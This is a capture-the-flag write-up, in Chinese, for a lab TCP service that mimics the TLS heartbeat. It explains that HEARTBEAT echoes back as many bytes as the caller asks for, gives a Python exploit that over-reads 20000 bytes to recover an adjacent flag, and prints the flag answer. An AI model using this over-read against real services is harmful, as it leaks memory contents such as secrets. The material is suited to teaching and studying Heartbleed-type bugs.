## 题目原文

> 一个基于 TCP 行协议、模拟 TLS 心跳（heartbeat）机制的服务，支持设置载荷并按请求长度回显数据。请分析其实现，找出可利用的内存安全缺陷并读取受保护的 flag。

## 题解

### 入口与指纹

TCP 横幅是 `200 tlsd ready`。命令是 `SETPAYLOAD <data>`、`HEARTBEAT <len>`、`DUMP`。`DUMP` 会报告当前 `payload_len` 并回显已写入的载荷。

### 关键观察

`HEARTBEAT` 按调用者声明的长度回显，不按真实载荷长度截断。载荷缓冲区是 4096 字节，多出来的部分先是 0。flag 紧挨在这 4096 字节后面。

`SETPAYLOAD Z` 之后：

| 声明长度 | 结果 |
| --- | --- |
| 300，等于刚写入的长度 | 只看到 `Z` 填充，没有 flag |
| 512 和 4096 | 载荷后面全是 0，仍然没有 flag |
| 20000 | 偏移 4096 处是 `flag{...}` |

这和 TLS heartbeat 的长度字段超过缓冲是同一类过度读取。

### 利用链

```bash
T=$(head -1 .target)
python3 - << PY
import socket
host, port = "$T".rsplit(":", 1)
s = socket.create_connection((host, int(port)), 6)
s.settimeout(4)
s.recv(4096)
s.sendall(b"SETPAYLOAD Z\\n")
s.recv(4096)
s.sendall(b"HEARTBEAT 20000\\n")
data = b""
while True:
    try:
        c = s.recv(1<<16)
        if not c: break
        data += c
    except socket.timeout:
        break
print(data[data.find(b"flag{"):data.find(b"flag{")+48])
PY
```

本次平台接受的值是 `flag{0b77317f-0230-4218-a94c-29f0659c790b}`。

### flag 位置

载荷缓冲区之后、偏移 4096 的相邻内存。只有声明长度大于 4096 的 `HEARTBEAT` 才会把它读回来。
